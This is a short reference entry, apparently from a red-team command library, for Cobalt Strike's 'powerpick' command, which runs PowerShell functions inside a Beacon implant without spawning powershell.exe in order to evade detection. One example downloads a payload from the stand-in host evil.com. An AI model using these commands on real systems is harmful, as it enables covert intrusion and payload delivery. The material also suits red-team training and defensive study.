---
id: 1375357a-f94a-42ac-b75f-9df4a2acf0cc
name: cobalt-strike-launch-function-using-unmanaged-powershell
type: command
executor: bash
data: powerpick function_name argument
output: null
created_at: '2023-04-06T03:56:16.489622+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - cobalt-strike
  - powershell
verified: true
validated: true
---

# Cobalt Strike Launch Function using Unmanaged PowerShell

## Command

```bash
powerpick function_name argument
```

## Description

Launches a PowerShell function using unmanaged execution in Beacon, avoiding the spawn of powershell.exe. Relies on the `spawnto` setting for the parent process to maintain stealth.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `function_name` | The PowerShell function to run | Yes |
| `argument` | Optional argument for the function | No |

## Examples

### Basic Usage

```bash
powerpick Run-Payload
```

Executes without arguments.

### Advanced Usage

```bash
powerpick Download-File http://evil.com/payload.exe
```

Passes a URL argument.

## Expected Output

Output from the function appears in Beacon console, e.g., "Payload downloaded successfully." No new processes visible if spawnto is configured properly.

## Related

- [[commands/cobalt-strike-execute-powershell-script]]
- [[procedures/powershell-script-execution-with-cobalt-strike]]
